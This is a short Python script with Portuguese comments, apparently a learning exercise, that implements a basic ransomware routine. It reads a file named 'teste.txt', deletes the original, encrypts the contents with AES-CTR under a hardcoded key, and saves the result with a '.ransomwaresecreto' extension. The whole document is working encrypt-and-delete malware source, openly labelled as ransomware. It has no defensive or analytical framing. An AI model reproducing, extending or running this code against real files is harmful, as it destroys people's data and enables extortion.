import os
import pyaes

##abrir o arquivo para criptografia

file_name = "teste.txt"
##nome do arquivo
file = open(file_name,"rb")
##le o arquivo
file_data = file.read()
##armazena o conteudo
file.close()
##fecha o arquivo

##remover o arquivo original

os.remove(file_name)
##exclui arquivo

##definir chave de encriptacao
key=b"batatinhasearroz"
##chave
aes = pyaes.AESModeOfOperationCTR(key)
##funcao de criptografia

##criptografar o arquivo
crypto_data = aes.encrypt(file_data)
##encripta o arquivo

##salva o arquivo
new_file = file_name+".ransomwaresecreto"
##cria nova variavel
new_file = open(f'{new_file}','wb')
##abre a variavel para escrita
new_file.write(crypto_data)
##escreve o texto criptografado
new_file.close()
##fecha o arquivo
